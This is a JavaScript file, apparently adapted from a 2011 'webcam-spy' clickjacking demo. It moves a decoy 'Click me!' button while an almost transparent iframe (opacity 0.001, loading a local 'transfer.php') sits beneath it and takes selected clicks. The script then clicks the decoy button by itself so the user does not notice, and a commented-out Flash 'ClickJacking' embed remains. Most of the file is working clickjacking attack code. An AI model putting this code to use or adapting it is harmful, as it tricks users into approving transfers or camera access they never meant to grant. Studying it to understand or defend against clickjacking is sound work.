/**  Copyright 2011 Feross Aboukhadijeh
 *
 *   Licensed under the Apache License, Version 2.0 (the "License");
 *   you may not use this file except in compliance with the License.
 *   You may obtain a copy of the License at
 *
 *       http://www.apache.org/licenses/LICENSE-2.0
 *
 *   Unless required by applicable law or agreed to in writing, software
 *   distributed under the License is distributed on an "AS IS" BASIS,
 *   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *   See the License for the specific language governing permissions and
 *   limitations under the License.
 */

/**
 *                   Author:  Feross Aboukhadijeh
 *  Blog post & explanation:  http://feross.org/webcam-spy/
 *                Live demo:  http://feross.org/hacks/webcam-spy/
 *
 *  Not the prettiest code I've written, but it does the job.
 */


/** var settingsCoords = [
 {x: -1100, y: -770},
 {x: -500, y: -670, refreshSettings: 400, refreshCam: 1},
 {x: -280, y: -840},
 {x: -100, y: -600, refreshSettings: 1, refreshCam: 400},
 {x: -1100, y: -770}];
 */

/** var settingsCoords = [
 {x: -17, y: -70},
 {x: -50, y: -70, refreshSettings: 400, refreshCam: 1},
 {x: -28, y: -40},
 {x: -10, y: -60, refreshSettings: 1, refreshCam: 400},
 {x: -10, y: -70}];

 */

var counter = 0;
var textChoices = ["Click me!", "Over here!", "Tap me!", "Press me!", "Touch me!"];
var settingsVisible = false;
var setCover = false;
// $('#settings iframe').css('opacity', 0.5);
$(function () {

    $('button.punch').click(function () {
        counter++;
        $('button.punch').text(textChoices[rand(textChoices.length)]);
        $('button.punch').css({left: rand(380), top: rand(350)});

        // Let the Flash settings manager get every nth click and let the blue
        // button get the rest. This is necessary since when Flash handles a
        // click, JavaScript doesn't get an event. So, we do it once in a while
        // and hope the user doesn't notice. Also, when we decide a click
        // belongs to Flash, we're not going to get an event for the click,
        // so we just click the button for the user after a short timeout.
        //alert("counter is:"+counter);
        if (counter == 1) {
            $('#settings iframe').css('opacity', 0.5);
            $('#tu').css("opacity", "1");
            $('#secret').css({"opacity": "1", left: (485), top: 435});
            $('button.punch').css({"opacity": 0});
            $('#tu5').css({height:45,top:495});
            $('#secret').mouseover(function () {
                $('#secret').css('z-index', 1); // let flash get clicks now
                window.setTimeout(function () {
                    $('button.punch').css({"opacity": "1"});
                    $('#settings iframe').css('opacity', 0.001);
                    $('#tu').css("opacity", "0");
                    $('#secret').css({"opacity": "0"});
                }, 2000);
                $('#secret').unbind('mouseover');
            });

        }
        if (counter == 2) {
            $('#settings iframe').css('opacity', 0.5);
            $('#tu').css("opacity", "1");
            $('#secret2').css({"opacity": "1", left: (490), top: 470});
            $('#tu5').css({height:45,top:467});
            $('button.punch').css({"opacity": 0});
            $('#secret2').mouseover(function () {
                $('#secret2').css('z-index', 1); // let flash get clicks now
                window.setTimeout(function () {

                    $('#secret2').css({"opacity": "0"});
                    $('button.punch').css({"opacity": "1"});
                    $('#settings iframe').css('opacity', 0.001);
                    // $('#tu').css({"opacity":"0"})
                    // $('#tu4').css({top:500});

                }, 2000);
                $('#secret').unbind('mouseover');
            });
            // $('#settings iframe').css('opacity', 0.001);
            // $('#secret2').css({"opacity":"0"});
        }

        if (counter == 3) {
            $('#settings iframe').css('opacity', 0.001);
            $('#tu5').css({height:40,top:467});

            $('button.punch').css({left: 390, top: 450});

            $('#tu4').css({top:600});
            $('button.punch').mouseover(function () {

                $('button.punch').css('z-index', 1); // let flash get clicks now
                window.setTimeout(function () {
                    // $('button.punch').css({'z-index', 100,"opacity":"1"}) ;// let the button get clicks now

                    $('button.punch').click();

                }, 3000);

                //           if($('button.punch').click())
                $('button.punch').unbind('mouseover');

            });
        }

        if (counter == 4){
            $('#tu5').css({height:80,top:465});
            $('#tu4').css({top:530});
            $('#tu').css("opacity", "0");

        }


    });

    $('#showHide').click(function (e) {
        settingsVisible = !settingsVisible;
        setSettingsVisibility();
        e.stopPropagation();
        e.preventDefault();

    });


    $('#needCover').click(function (e) {
        setCover = !setCover;
        SetCover();
        e.stopPropagation();
        e.preventDefault();
    });


    refreshSettings(1);


    $('#container').css({left: 100, top: 100});


});

// Random number between 1 and n
function rand(n) {
    return Math.floor(Math.random() * (n + 1))
}

function setSettingsVisibility() {
    if (settingsVisible) {
        $('#settings iframe').css('opacity', 0.5);
        // $('#settings iframe').css("background-color","black");
    } else {
        $('#settings iframe').css('opacity', 0.001);
        // $('#settings iframe').css('opacity', 0.5);
    }
}

function SetCover() {
    if (setCover) {
        $('#tu').css('opacity', 1);
    } else {
        $('#tu').css('opacity', 0.001);
    }
}

function refreshSettings(timeout) {
    window.setTimeout(function () {
        //alert("2");
        //$('#settings').empty().append($('<iframe allowtransparency="true" src="http://localhost:5000/transfer.php"></iframe>'));
        $('#settings').empty().append($('<iframe  id="cc"    name="hh" scrolling="no" onautocomplete="" allowtransparency="true" src="http://localhost/transfer.php"></iframe>'));
        setSettingsVisibility();
    }, timeout);
}

/** function refreshCam(timeout) {
    window.setTimeout(function() {
	alert("3");
        $('#cam').empty().append($('<embed wmode="transparent" width="320" height="240" align="middle" type="application/x-shockwave-flash" pluginspage="http://www.adobe.com/go/getflashplayer" name="ClickJacking" quality="high" id="ClickJacking" src="swf/ClickJacking.swf?131"/>'));
    }, timeout);
}*/

//
